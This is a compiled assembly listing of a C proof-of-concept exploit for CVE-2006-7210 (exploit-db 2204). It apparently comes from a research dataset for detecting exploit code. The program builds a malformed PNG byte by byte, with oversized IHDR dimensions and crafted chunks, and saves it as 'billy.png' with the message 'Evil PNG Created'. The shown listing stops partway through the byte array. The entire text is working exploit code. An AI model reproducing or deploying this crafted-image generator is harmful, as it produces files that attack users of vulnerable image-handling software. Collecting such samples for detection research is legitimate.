; Listing generated by Microsoft (R) Optimizing Compiler Version 19.28.29913.0 

	TITLE	C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_2204_cve_id_CVE-2006-7210.obj
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	___local_stdio_printf_options
PUBLIC	__vfprintf_l
PUBLIC	_printf
PUBLIC	_main
EXTRN	___acrt_iob_func:PROC
EXTRN	_fclose:PROC
EXTRN	_fopen:PROC
EXTRN	_fwrite:PROC
EXTRN	___stdio_common_vfprintf:PROC
EXTRN	@__security_check_cookie@4:PROC
EXTRN	___security_cookie:DWORD
_DATA	SEGMENT
COMM	?_OptionsStorage@?1??__local_stdio_printf_options@@9@9:QWORD							; `__local_stdio_printf_options'::`2'::_OptionsStorage
_DATA	ENDS
_DATA	SEGMENT
$SG11607 DB	'billy.png', 00H
	ORG $+2
$SG11608 DB	'w', 00H
	ORG $+2
$SG11609 DB	'Evil PNG Created', 0aH, 'Cya around,', 0aH, 'Preddy', 0aH
	DB	00H
_DATA	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_evilpng$ = -2508					; size = 4
_winpng$ = -2504					; size = 4
_png$ = -2500						; size = 2495
__$ArrayPad$ = -4					; size = 4
_argc$ = 8						; size = 4
_argv$ = 12						; size = 4
_main	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_2204_cve_id_CVE-2006-7210.c
; Line 45
	push	ebp
	mov	ebp, esp
	sub	esp, 2508				; 000009ccH
	mov	eax, DWORD PTR ___security_cookie
	xor	eax, ebp
	mov	DWORD PTR __$ArrayPad$[ebp], eax
; Line 47
	mov	DWORD PTR _evilpng$[ebp], OFFSET $SG11607
; Line 50
	mov	BYTE PTR _png$[ebp], -119		; ffffff89H
	mov	BYTE PTR _png$[ebp+1], 80		; 00000050H
	mov	BYTE PTR _png$[ebp+2], 78		; 0000004eH
	mov	BYTE PTR _png$[ebp+3], 71		; 00000047H
	mov	BYTE PTR _png$[ebp+4], 13		; 0000000dH
	mov	BYTE PTR _png$[ebp+5], 10		; 0000000aH
	mov	BYTE PTR _png$[ebp+6], 26		; 0000001aH
	mov	BYTE PTR _png$[ebp+7], 10		; 0000000aH
	mov	BYTE PTR _png$[ebp+8], 0
	mov	BYTE PTR _png$[ebp+9], 0
	mov	BYTE PTR _png$[ebp+10], 0
	mov	BYTE PTR _png$[ebp+11], 13		; 0000000dH
	mov	BYTE PTR _png$[ebp+12], 73		; 00000049H
	mov	BYTE PTR _png$[ebp+13], 72		; 00000048H
	mov	BYTE PTR _png$[ebp+14], 68		; 00000044H
	mov	BYTE PTR _png$[ebp+15], 82		; 00000052H
	mov	BYTE PTR _png$[ebp+16], 0
	mov	BYTE PTR _png$[ebp+17], 0
	mov	BYTE PTR _png$[ebp+18], -1
	mov	BYTE PTR _png$[ebp+19], -1
	mov	BYTE PTR _png$[ebp+20], 0
	mov	BYTE PTR _png$[ebp+21], 0
	mov	BYTE PTR _png$[ebp+22], -1
	mov	BYTE PTR _png$[ebp+23], -1
	mov	BYTE PTR _png$[ebp+24], 8
	mov	BYTE PTR _png$[ebp+25], 0
	mov	BYTE PTR _png$[ebp+26], 0
	mov	BYTE PTR _png$[ebp+27], 0
	mov	BYTE PTR _png$[ebp+28], 0
	mov	BYTE PTR _png$[ebp+29], -61		; ffffffc3H
	mov	BYTE PTR _png$[ebp+30], 7
	mov	BYTE PTR _png$[ebp+31], -15		; fffffff1H
	mov	BYTE PTR _png$[ebp+32], 92		; 0000005cH
	mov	BYTE PTR _png$[ebp+33], 0
	mov	BYTE PTR _png$[ebp+34], 0
	mov	BYTE PTR _png$[ebp+35], 0
	mov	BYTE PTR _png$[ebp+36], 7
	mov	BYTE PTR _png$[ebp+37], 116		; 00000074H
	mov	BYTE PTR _png$[ebp+38], 73		; 00000049H
	mov	BYTE PTR _png$[ebp+39], 77		; 0000004dH
	mov	BYTE PTR _png$[ebp+40], 69		; 00000045H
	mov	BYTE PTR _png$[ebp+41], 7
	mov	BYTE PTR _png$[ebp+42], -42		; ffffffd6H
	mov	BYTE PTR _png$[ebp+43], 2
	mov	BYTE PTR _png$[ebp+44], 14		; 0000000eH
	mov	BYTE PTR _png$[ebp+45], 15		; 0000000fH
	mov	BYTE PTR _png$[ebp+46], 37		; 00000025H
	mov	BYTE PTR _png$[ebp+47], 18		; 00000012H
	mov	BYTE PTR _png$[ebp+48], -126		; ffffff82H
	mov	BYTE PTR _png$[ebp+49], -70		; ffffffbaH
	mov	BYTE PTR _png$[ebp+50], -105		; ffffff97H
	mov	BYTE PTR _png$[ebp+51], 83		; 00000053H
	mov	BYTE PTR _png$[ebp+52], 0
	mov	BYTE PTR _png$[ebp+53], 0
	mov	BYTE PTR _png$[ebp+54], 0
	mov	BYTE PTR _png$[ebp+55], 9
	mov	BYTE PTR _png$[ebp+56], 112		; 00000070H
	mov	BYTE PTR _png$[ebp+57], 72		; 00000048H
	mov	BYTE PTR _png$[ebp+58], 89		; 00000059H
	mov	BYTE PTR _png$[ebp+59], 115		; 00000073H
	mov	BYTE PTR _png$[ebp+60], 0
	mov	BYTE PTR _png$[ebp+61], 0
	mov	BYTE PTR _png$[ebp+62], 10		; 0000000aH
	mov	BYTE PTR _png$[ebp+63], -16		; fffffff0H
	mov	BYTE PTR _png$[ebp+64], 0
	mov	BYTE PTR _png$[ebp+65], 0
	mov	BYTE PTR _png$[ebp+66], 10		; 0000000aH
	mov	BYTE PTR _png$[ebp+67], -16		; fffffff0H
	mov	BYTE PTR _png$[ebp+68], 1
	mov	BYTE PTR _png$[ebp+69], 66		; 00000042H
	mov	BYTE PTR _png$[ebp+70], -84		; ffffffacH
	mov	BYTE PTR _png$[ebp+71], 52		; 00000034H
	mov	BYTE PTR _png$[ebp+72], -104		; ffffff98H
	mov	BYTE PTR _png$[ebp+73], 0
	mov	BYTE PTR _png$[ebp+74], 0
	mov	BYTE PTR _png$[ebp+75], 0
	mov	BYTE PTR _png$[ebp+76], 4
	mov	BYTE PTR _png$[ebp+77], 103		; 00000067H
	mov	BYTE PTR _png$[ebp+78], 65		; 00000041H
	mov	BYTE PTR _png$[ebp+79], 77		; 0000004dH
	mov	BYTE PTR _png$[ebp+80], 65		; 00000041H
	mov	BYTE PTR _png$[ebp+81], 0
	mov	BYTE PTR _png$[ebp+82], 0
	mov	BYTE PTR _png$[ebp+83], -79		; ffffffb1H
	mov	BYTE PTR _png$[ebp+84], -113		; ffffff8fH
	mov	BYTE PTR _png$[ebp+85], 11		; 0000000bH
	mov	BYTE PTR _png$[ebp+86], -4		; fffffffcH
	mov	BYTE PTR _png$[ebp+87], 97		; 00000061H
	mov	BYTE PTR _png$[ebp+88], 5
	mov	BYTE PTR _png$[ebp+89], 0
	mov	BYTE PTR _png$[ebp+90], 0
	mov	BYTE PTR _png$[ebp+91], 9
	mov	BYTE PTR _png$[ebp+92], 77		; 0000004dH
	mov	BYTE PTR _png$[ebp+93], 73		; 00000049H
	mov	BYTE PTR _png$[ebp+94], 68		; 00000044H
	mov	BYTE PTR _png$[ebp+95], 65		; 00000041H
	mov	BYTE PTR _png$[ebp+96], 84		; 00000054H
	mov	BYTE PTR _png$[ebp+97], 120		; 00000078H
	mov	BYTE PTR _png$[ebp+98], -38		; ffffffdaH
	mov	BYTE PTR _png$[ebp+99], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+100], -99		; ffffff9dH
	mov	BYTE PTR _png$[ebp+101], 65		; 00000041H
	mov	BYTE PTR _png$[ebp+102], 108		; 0000006cH
	mov	BYTE PTR _png$[ebp+103], 27		; 0000001bH
	mov	BYTE PTR _png$[ebp+104], 69		; 00000045H
	mov	BYTE PTR _png$[ebp+105], 20		; 00000014H
	mov	BYTE PTR _png$[ebp+106], 64		; 00000040H
	mov	BYTE PTR _png$[ebp+107], 39		; 00000027H
	mov	BYTE PTR _png$[ebp+108], -1
	mov	BYTE PTR _png$[ebp+109], 0
	mov	BYTE PTR _png$[ebp+110], 0
	mov	BYTE PTR _png$[ebp+111], 0
	mov	BYTE PTR _png$[ebp+112], -1
	mov	BYTE PTR _png$[ebp+113], 0
	mov	BYTE PTR _png$[ebp+114], -1
	mov	BYTE PTR _png$[ebp+115], 0
	mov	BYTE PTR _png$[ebp+116], 0
	mov	BYTE PTR _png$[ebp+117], 0
	mov	BYTE PTR _png$[ebp+118], 0
	mov	BYTE PTR _png$[ebp+119], -1
	mov	BYTE PTR _png$[ebp+120], -1
	mov	BYTE PTR _png$[ebp+121], 0
	mov	BYTE PTR _png$[ebp+122], -1
	mov	BYTE PTR _png$[ebp+123], 0
	mov	BYTE PTR _png$[ebp+124], -1
	mov	BYTE PTR _png$[ebp+125], -1
	mov	BYTE PTR _png$[ebp+126], -1
	mov	BYTE PTR _png$[ebp+127], -1
	mov	BYTE PTR _png$[ebp+128], -1
	mov	BYTE PTR _png$[ebp+129], -56		; ffffffc8H
	mov	BYTE PTR _png$[ebp+130], -88		; ffffffa8H
	mov	BYTE PTR _png$[ebp+131], -67		; ffffffbdH
	mov	BYTE PTR _png$[ebp+132], -108		; ffffff94H
	mov	BYTE PTR _png$[ebp+133], 10		; 0000000aH
	mov	BYTE PTR _png$[ebp+134], -55		; ffffffc9H
	mov	BYTE PTR _png$[ebp+135], 45		; 0000002dH
	mov	BYTE PTR _png$[ebp+136], 28		; 0000001cH
	mov	BYTE PTR _png$[ebp+137], 32		; 00000020H
	mov	BYTE PTR _png$[ebp+138], 112		; 00000070H
	mov	BYTE PTR _png$[ebp+139], 113		; 00000071H
	mov	BYTE PTR _png$[ebp+140], 122		; 0000007aH
	mov	BYTE PTR _png$[ebp+141], -1
	mov	BYTE PTR _png$[ebp+142], -1
	mov	BYTE PTR _png$[ebp+143], -1
	mov	BYTE PTR _png$[ebp+144], -1
	mov	BYTE PTR _png$[ebp+145], -1
	mov	BYTE PTR _png$[ebp+146], -1
	mov	BYTE PTR _png$[ebp+147], -1
	mov	BYTE PTR _png$[ebp+148], -1
	mov	BYTE PTR _png$[ebp+149], -1
	mov	BYTE PTR _png$[ebp+150], -1
	mov	BYTE PTR _png$[ebp+151], -1
	mov	BYTE PTR _png$[ebp+152], -1
	mov	BYTE PTR _png$[ebp+153], -1
	mov	BYTE PTR _png$[ebp+154], 0
	mov	BYTE PTR _png$[ebp+155], 77		; 0000004dH
	mov	BYTE PTR _png$[ebp+156], 14		; 0000000eH
	mov	BYTE PTR _png$[ebp+157], 117		; 00000075H
	mov	BYTE PTR _png$[ebp+158], 85		; 00000055H
	mov	BYTE PTR _png$[ebp+159], 85		; 00000055H
	mov	BYTE PTR _png$[ebp+160], 74		; 0000004aH
	mov	BYTE PTR _png$[ebp+161], 114		; 00000072H
	mov	BYTE PTR _png$[ebp+162], 49		; 00000031H
	mov	BYTE PTR _png$[ebp+163], 106		; 0000006aH
	mov	BYTE PTR _png$[ebp+164], 57		; 00000039H
	mov	BYTE PTR _png$[ebp+165], -40		; ffffffd8H
	mov	BYTE PTR _png$[ebp+166], -123		; ffffff85H
	mov	BYTE PTR _png$[ebp+167], -125		; ffffff83H
	mov	BYTE PTR _png$[ebp+168], 91		; 0000005bH
	mov	BYTE PTR _png$[ebp+169], 9
	mov	BYTE PTR _png$[ebp+170], -46		; ffffffd2H
	mov	BYTE PTR _png$[ebp+171], 20		; 00000014H
	mov	BYTE PTR _png$[ebp+172], 85		; 00000055H
	mov	BYTE PTR _png$[ebp+173], -56		; ffffffc8H
	mov	BYTE PTR _png$[ebp+174], 43		; 0000002bH
	mov	BYTE PTR _png$[ebp+175], -95		; ffffffa1H
	mov	BYTE PTR _png$[ebp+176], 38		; 00000026H
	mov	BYTE PTR _png$[ebp+177], 21		; 00000015H
	mov	BYTE PTR _png$[ebp+178], 72		; 00000048H
	mov	BYTE PTR _png$[ebp+179], -40		; ffffffd8H
	mov	BYTE PTR _png$[ebp+180], 22		; 00000016H
	mov	BYTE PTR _png$[ebp+181], 18		; 00000012H
	mov	BYTE PTR _png$[ebp+182], 105		; 00000069H
	mov	BYTE PTR _png$[ebp+183], 0
	mov	BYTE PTR _png$[ebp+184], 1
	mov	BYTE PTR _png$[ebp+185], 42		; 0000002aH
	mov	BYTE PTR _png$[ebp+186], 98		; 00000062H
	mov	BYTE PTR _png$[ebp+187], 89		; 00000059H
	mov	BYTE PTR _png$[ebp+188], -17		; ffffffefH
	mov	BYTE PTR _png$[ebp+189], 122		; 0000007aH
	mov	BYTE PTR _png$[ebp+190], -41		; ffffffd7H
	mov	BYTE PTR _png$[ebp+191], 94		; 0000005eH
	mov	BYTE PTR _png$[ebp+192], 123		; 0000007bH
	mov	BYTE PTR _png$[ebp+193], 118		; 00000076H
	mov	BYTE PTR _png$[ebp+194], -2		; fffffffeH
	mov	BYTE PTR _png$[ebp+195], -1
	mov	BYTE PTR _png$[ebp+196], 51		; 00000033H
	mov	BYTE PTR _png$[ebp+197], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+198], 54		; 00000036H
	mov	BYTE PTR _png$[ebp+199], -1
	mov	BYTE PTR _png$[ebp+200], 20		; 00000014H
	mov	BYTE PTR _png$[ebp+201], 123		; 0000007bH
	mov	BYTE PTR _png$[ebp+202], -1
	mov	BYTE PTR _png$[ebp+203], -18		; ffffffeeH
	mov	BYTE PTR _png$[ebp+204], 62		; 0000003eH
	mov	BYTE PTR _png$[ebp+205], -1
	mov	BYTE PTR _png$[ebp+206], -103		; ffffff99H
	mov	BYTE PTR _png$[ebp+207], -1
	mov	BYTE PTR _png$[ebp+208], -25		; ffffffe7H
	mov	BYTE PTR _png$[ebp+209], -49		; ffffffcfH
	mov	BYTE PTR _png$[ebp+210], -52		; ffffffccH
	mov	BYTE PTR _png$[ebp+211], -33		; ffffffdfH
	mov	BYTE PTR _png$[ebp+212], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+213], -104		; ffffff98H
	mov	BYTE PTR _png$[ebp+214], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+215], 2
	mov	BYTE PTR _png$[ebp+216], -7		; fffffff9H
	mov	BYTE PTR _png$[ebp+217], -25		; ffffffe7H
	mov	BYTE PTR _png$[ebp+218], -57		; ffffffc7H
	mov	BYTE PTR _png$[ebp+219], -33		; ffffffdfH
	mov	BYTE PTR _png$[ebp+220], -40		; ffffffd8H
	mov	BYTE PTR _png$[ebp+221], 54		; 00000036H
	mov	BYTE PTR _png$[ebp+222], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+223], -57		; ffffffc7H
	mov	BYTE PTR _png$[ebp+224], -116		; ffffff8cH
	mov	BYTE PTR _png$[ebp+225], -99		; ffffff9dH
	mov	BYTE PTR _png$[ebp+226], -67		; ffffffbdH
	mov	BYTE PTR _png$[ebp+227], 15		; 0000000fH
	mov	BYTE PTR _png$[ebp+228], -63		; ffffffc1H
	mov	BYTE PTR _png$[ebp+229], -97		; ffffff9fH
	mov	BYTE PTR _png$[ebp+230], -10		; fffffff6H
	mov	BYTE PTR _png$[ebp+231], -9		; fffffff7H
	mov	BYTE PTR _png$[ebp+232], -27		; ffffffe5H
	mov	BYTE PTR _png$[ebp+233], -17		; ffffffefH
	mov	BYTE PTR _png$[ebp+234], -66		; ffffffbeH
	mov	BYTE PTR _png$[ebp+235], -7		; fffffff9H
	mov	BYTE PTR _png$[ebp+236], 61		; 0000003dH
	mov	BYTE PTR _png$[ebp+237], 110		; 0000006eH
	mov	BYTE PTR _png$[ebp+238], -74		; ffffffb6H
	mov	BYTE PTR _png$[ebp+239], -128		; ffffff80H
	mov	BYTE PTR _png$[ebp+240], -15		; fffffff1H
	mov	BYTE PTR _png$[ebp+241], -23		; ffffffe9H
	mov	BYTE PTR _png$[ebp+242], -105		; ffffff97H
	mov	BYTE PTR _png$[ebp+243], 94		; 0000005eH
	mov	BYTE PTR _png$[ebp+244], 125		; 0000007dH
	mov	BYTE PTR _png$[ebp+245], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+246], -8		; fffffff8H
	mov	BYTE PTR _png$[ebp+247], 100		; 00000064H
	mov	BYTE PTR _png$[ebp+248], -69		; ffffffbbH
	mov	BYTE PTR _png$[ebp+249], -14		; fffffff2H
	mov	BYTE PTR _png$[ebp+250], -57		; ffffffc7H
	mov	BYTE PTR _png$[ebp+251], -41		; ffffffd7H
	mov	BYTE PTR _png$[ebp+252], -17		; ffffffefH
	mov	BYTE PTR _png$[ebp+253], 60		; 0000003cH
	mov	BYTE PTR _png$[ebp+254], -95		; ffffffa1H
	mov	BYTE PTR _png$[ebp+255], 112		; 00000070H
	mov	BYTE PTR _png$[ebp+256], -55		; ffffffc9H
	mov	BYTE PTR _png$[ebp+257], 17		; 00000011H
	mov	BYTE PTR _png$[ebp+258], -56		; ffffffc8H
	mov	BYTE PTR _png$[ebp+259], -40		; ffffffd8H
	mov	BYTE PTR _png$[ebp+260], -2		; fffffffeH
	mov	BYTE PTR _png$[ebp+261], 83		; 00000053H
	mov	BYTE PTR _png$[ebp+262], 119		; 00000077H
	mov	BYTE PTR _png$[ebp+263], 30		; 0000001eH
	mov	BYTE PTR _png$[ebp+264], 120		; 00000078H
	mov	BYTE PTR _png$[ebp+265], 112		; 00000070H
	mov	BYTE PTR _png$[ebp+266], 30		; 0000001eH
	mov	BYTE PTR _png$[ebp+267], -29		; ffffffe3H
	mov	BYTE PTR _png$[ebp+268], 15		; 0000000fH
	mov	BYTE PTR _png$[ebp+269], 71		; 00000047H
	mov	BYTE PTR _png$[ebp+270], 31		; 0000001fH
	mov	BYTE PTR _png$[ebp+271], -115		; ffffff8dH
	mov	BYTE PTR _png$[ebp+272], -101		; ffffff9bH
	mov	BYTE PTR _png$[ebp+273], -119		; ffffff89H
	mov	BYTE PTR _png$[ebp+274], 35		; 00000023H
	mov	BYTE PTR _png$[ebp+275], -113		; ffffff8fH
	mov	BYTE PTR _png$[ebp+276], -65		; ffffffbfH
	mov	BYTE PTR _png$[ebp+277], -69		; ffffffbbH
	mov	BYTE PTR _png$[ebp+278], -43		; ffffffd5H
	mov	BYTE PTR _png$[ebp+279], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+280], -4		; fffffffcH
	mov	BYTE PTR _png$[ebp+281], -31		; ffffffe1H
	mov	BYTE PTR _png$[ebp+282], -123		; ffffff85H
	mov	BYTE PTR _png$[ebp+283], -72		; ffffffb8H
	mov	BYTE PTR _png$[ebp+284], 113		; 00000071H
	mov	BYTE PTR _png$[ebp+285], -8		; fffffff8H
	mov	BYTE PTR _png$[ebp+286], -78		; ffffffb2H
	mov	BYTE PTR _png$[ebp+287], -29		; ffffffe3H
	mov	BYTE PTR _png$[ebp+288], -28		; ffffffe4H
	mov	BYTE PTR _png$[ebp+289], -106		; ffffff96H
	mov	BYTE PTR _png$[ebp+290], -49		; ffffffcfH
	mov	BYTE PTR _png$[ebp+291], -72		; ffffffb8H
	mov	BYTE PTR _png$[ebp+292], 93		; 0000005dH
	mov	BYTE PTR _png$[ebp+293], 17		; 00000011H
	mov	BYTE PTR _png$[ebp+294], 125		; 0000007dH
	mov	BYTE PTR _png$[ebp+295], 72		; 00000048H
	mov	BYTE PTR _png$[ebp+296], -121		; ffffff87H
	mov	BYTE PTR _png$[ebp+297], -15		; fffffff1H
	mov	BYTE PTR _png$[ebp+298], -17		; ffffffefH
	mov	BYTE PTR _png$[ebp+299], -41		; ffffffd7H
	mov	BYTE PTR _png$[ebp+300], -29		; ffffffe3H
	mov	BYTE PTR _png$[ebp+301], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+302], 17		; 00000011H
	mov	BYTE PTR _png$[ebp+303], 64		; 00000040H
	mov	BYTE PTR _png$[ebp+304], -50		; ffffffceH
	mov	BYTE PTR _png$[ebp+305], 123		; 0000007bH
	mov	BYTE PTR _png$[ebp+306], -116		; ffffff8cH
	mov	BYTE PTR _png$[ebp+307], -43		; ffffffd5H
	mov	BYTE PTR _png$[ebp+308], -19		; ffffffedH
	mov	BYTE PTR _png$[ebp+309], -40		; ffffffd8H
	mov	BYTE PTR _png$[ebp+310], 23		; 00000017H
	mov	BYTE PTR _png$[ebp+311], 125		; 0000007dH
	mov	BYTE PTR _png$[ebp+312], -39		; ffffffd9H
	mov	BYTE PTR _png$[ebp+313], -1
	mov	BYTE PTR _png$[ebp+314], 115		; 00000073H
	mov	BYTE PTR _png$[ebp+315], -121		; ffffff87H
	mov	BYTE PTR _png$[ebp+316], -15		; fffffff1H
	mov	BYTE PTR _png$[ebp+317], -33		; ffffffdfH
	mov	BYTE PTR _png$[ebp+318], -73		; ffffffb7H
	mov	BYTE PTR _png$[ebp+319], -93		; ffffffa3H
	mov	BYTE PTR _png$[ebp+320], -114		; ffffff8eH
	mov	BYTE PTR _png$[ebp+321], 27		; 0000001bH
	mov	BYTE PTR _png$[ebp+322], -103		; ffffff99H
	mov	BYTE PTR _png$[ebp+323], -72		; ffffffb8H
	mov	BYTE PTR _png$[ebp+324], 9
	mov	BYTE PTR _png$[ebp+325], -99		; ffffff9dH
	mov	BYTE PTR _png$[ebp+326], -40		; ffffffd8H
	mov	BYTE PTR _png$[ebp+327], 120		; 00000078H
	mov	BYTE PTR _png$[ebp+328], -79		; ffffffb1H
	mov	BYTE PTR _png$[ebp+329], -61		; ffffffc3H
	mov	BYTE PTR _png$[ebp+330], 120		; 00000078H
	mov	BYTE PTR _png$[ebp+331], 39		; 00000027H
	mov	BYTE PTR _png$[ebp+332], 50		; 00000032H
	mov	BYTE PTR _png$[ebp+333], -24		; ffffffe8H
	mov	BYTE PTR _png$[ebp+334], 100		; 00000064H
	mov	BYTE PTR _png$[ebp+335], -20		; ffffffecH
	mov	BYTE PTR _png$[ebp+336], 122		; 0000007aH
	mov	BYTE PTR _png$[ebp+337], 54		; 00000036H
	mov	BYTE PTR _png$[ebp+338], 110		; 0000006eH
	mov	BYTE PTR _png$[ebp+339], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+340], 54		; 00000036H
	mov	BYTE PTR _png$[ebp+341], 117		; 00000075H
	mov	BYTE PTR _png$[ebp+342], -33		; ffffffdfH
	mov	BYTE PTR _png$[ebp+343], 97		; 00000061H
	mov	BYTE PTR _png$[ebp+344], -4		; fffffffcH
	mov	BYTE PTR _png$[ebp+345], 48		; 00000030H
	mov	BYTE PTR _png$[ebp+346], -14		; fffffff2H
	mov	BYTE PTR _png$[ebp+347], 112		; 00000070H
	mov	BYTE PTR _png$[ebp+348], -58		; ffffffc6H
	mov	BYTE PTR _png$[ebp+349], -23		; ffffffe9H
	mov	BYTE PTR _png$[ebp+350], 11		; 0000000bH
	mov	BYTE PTR _png$[ebp+351], -115		; ffffff8dH
	mov	BYTE PTR _png$[ebp+352], -100		; ffffff9cH
	mov	BYTE PTR _png$[ebp+353], 17		; 00000011H
	mov	BYTE PTR _png$[ebp+354], 47		; 0000002fH
	mov	BYTE PTR _png$[ebp+355], -29		; ffffffe3H
	mov	BYTE PTR _png$[ebp+356], -82		; ffffffaeH
	mov	BYTE PTR _png$[ebp+357], -86		; ffffffaaH
	mov	BYTE PTR _png$[ebp+358], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+359], -2		; fffffffeH
	mov	BYTE PTR _png$[ebp+360], -116		; ffffff8cH
	mov	BYTE PTR _png$[ebp+361], 118		; 00000076H
	mov	BYTE PTR _png$[ebp+362], -22		; ffffffeaH
	mov	BYTE PTR _png$[ebp+363], -116		; ffffff8cH
	mov	BYTE PTR _png$[ebp+364], 27		; 0000001bH
	mov	BYTE PTR _png$[ebp+365], -99		; ffffff9dH
	mov	BYTE PTR _png$[ebp+366], -30		; ffffffe2H
	mov	BYTE PTR _png$[ebp+367], -74		; ffffffb6H
	mov	BYTE PTR _png$[ebp+368], 101		; 00000065H
	mov	BYTE PTR _png$[ebp+369], -63		; ffffffc1H
	mov	BYTE PTR _png$[ebp+370], 102		; 00000066H
	mov	BYTE PTR _png$[ebp+371], 91		; 0000005bH
	mov	BYTE PTR _png$[ebp+372], 7
	mov	BYTE PTR _png$[ebp+373], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+374], -113		; ffffff8fH
	mov	BYTE PTR _png$[ebp+375], 38		; 00000026H
	mov	BYTE PTR _png$[ebp+376], -67		; ffffffbdH
	mov	BYTE PTR _png$[ebp+377], 48		; 00000030H
	mov	BYTE PTR _png$[ebp+378], 111		; 0000006fH
	mov	BYTE PTR _png$[ebp+379], 87		; 00000057H
	mov	BYTE PTR _png$[ebp+380], -110		; ffffff92H
	mov	BYTE PTR _png$[ebp+381], 113		; 00000071H
	mov	BYTE PTR _png$[ebp+382], 50		; 00000032H
	mov	BYTE PTR _png$[ebp+383], -66		; ffffffbeH
	mov	BYTE PTR _png$[ebp+384], -16		; fffffff0H
	mov	BYTE PTR _png$[ebp+385], -89		; ffffffa7H
	mov	BYTE PTR _png$[ebp+386], -120		; ffffff88H
	mov	BYTE PTR _png$[ebp+387], -47		; ffffffd1H
	mov	BYTE PTR _png$[ebp+388], -76		; ffffffb4H
	mov	BYTE PTR _png$[ebp+389], 125		; 0000007dH
	mov	BYTE PTR _png$[ebp+390], 41		; 00000029H
	mov	BYTE PTR _png$[ebp+391], -102		; ffffff9aH
	mov	BYTE PTR _png$[ebp+392], -15		; fffffff1H
	mov	BYTE PTR _png$[ebp+393], 49		; 00000031H
	mov	BYTE PTR _png$[ebp+394], 30		; 0000001eH
	mov	BYTE PTR _png$[ebp+395], -40		; ffffffd8H
	mov	BYTE PTR _png$[ebp+396], 122		; 0000007aH
	mov	BYTE PTR _png$[ebp+397], 8
	mov	BYTE PTR _png$[ebp+398], -91		; ffffffa5H
	mov	BYTE PTR _png$[ebp+399], 55		; 00000037H
	mov	BYTE PTR _png$[ebp+400], 123		; 0000007bH
	mov	BYTE PTR _png$[ebp+401], 61		; 0000003dH
	mov	BYTE PTR _png$[ebp+402], 63		; 0000003fH
	mov	BYTE PTR _png$[ebp+403], -86		; ffffffaaH
	mov	BYTE PTR _png$[ebp+404], 110		; 0000006eH
	mov	BYTE PTR _png$[ebp+405], -103		; ffffff99H
	mov	BYTE PTR _png$[ebp+406], 44		; 0000002cH
	mov	BYTE PTR _png$[ebp+407], -28		; ffffffe4H
	mov	BYTE PTR _png$[ebp+408], 64		; 00000040H
	mov	BYTE PTR _png$[ebp+409], 29		; 0000001dH
	mov	BYTE PTR _png$[ebp+410], -127		; ffffff81H
	mov	BYTE PTR _png$[ebp+411], 29		; 0000001dH
	mov	BYTE PTR _png$[ebp+412], 89		; 00000059H
	mov	BYTE PTR _png$[ebp+413], -45		; ffffffd3H
	mov	BYTE PTR _png$[ebp+414], -18		; ffffffeeH
	mov	BYTE PTR _png$[ebp+415], 73		; 00000049H
	mov	BYTE PTR _png$[ebp+416], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+417], 36		; 00000024H
	mov	BYTE PTR _png$[ebp+418], -35		; ffffffddH
	mov	BYTE PTR _png$[ebp+419], 50		; 00000032H
	mov	BYTE PTR _png$[ebp+420], 91		; 0000005bH
	mov	BYTE PTR _png$[ebp+421], 111		; 0000006fH
	mov	BYTE PTR _png$[ebp+422], -38		; ffffffdaH
	mov	BYTE PTR _png$[ebp+423], 21		; 00000015H
	mov	BYTE PTR _png$[ebp+424], -79		; ffffffb1H
	mov	BYTE PTR _png$[ebp+425], -54		; ffffffcaH
	mov	BYTE PTR _png$[ebp+426], -127		; ffffff81H
	mov	BYTE PTR _png$[ebp+427], 45		; 0000002dH
	mov	BYTE PTR _png$[ebp+428], 52		; 00000034H
	mov	BYTE PTR _png$[ebp+429], -93		; ffffffa3H
	mov	BYTE PTR _png$[ebp+430], -45		; ffffffd3H
	mov	BYTE PTR _png$[ebp+431], 45		; 0000002dH
	mov	BYTE PTR _png$[ebp+432], -75		; ffffffb5H
	mov	BYTE PTR _png$[ebp+433], 55		; 00000037H
	mov	BYTE PTR _png$[ebp+434], 120		; 00000078H
	mov	BYTE PTR _png$[ebp+435], -74		; ffffffb6H
	mov	BYTE PTR _png$[ebp+436], -18		; ffffffeeH
	mov	BYTE PTR _png$[ebp+437], 58		; 0000003aH
	mov	BYTE PTR _png$[ebp+438], -91		; ffffffa5H
	mov	BYTE PTR _png$[ebp+439], 18		; 00000012H
	mov	BYTE PTR _png$[ebp+440], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+441], 35		; 00000023H
	mov	BYTE PTR _png$[ebp+442], -60		; ffffffc4H
	mov	BYTE PTR _png$[ebp+443], 104		; 00000068H
	mov	BYTE PTR _png$[ebp+444], 55		; 00000037H
	mov	BYTE PTR _png$[ebp+445], 11		; 0000000bH
	mov	BYTE PTR _png$[ebp+446], 90		; 0000005aH
	mov	BYTE PTR _png$[ebp+447], 27		; 0000001bH
	mov	BYTE PTR _png$[ebp+448], 60		; 0000003cH
	mov	BYTE PTR _png$[ebp+449], 89		; 00000059H
	mov	BYTE PTR _png$[ebp+450], -18		; ffffffeeH
	mov	BYTE PTR _png$[ebp+451], -74		; ffffffb6H
	mov	BYTE PTR _png$[ebp+452], -112		; ffffff90H
	mov	BYTE PTR _png$[ebp+453], 18		; 00000012H
	mov	BYTE PTR _png$[ebp+454], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+455], -39		; ffffffd9H
	mov	BYTE PTR _png$[ebp+456], 30		; 0000001eH
	mov	BYTE PTR _png$[ebp+457], -112		; ffffff90H
	mov	BYTE PTR _png$[ebp+458], -70		; ffffffbaH
	mov	BYTE PTR _png$[ebp+459], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+460], 15		; 0000000fH
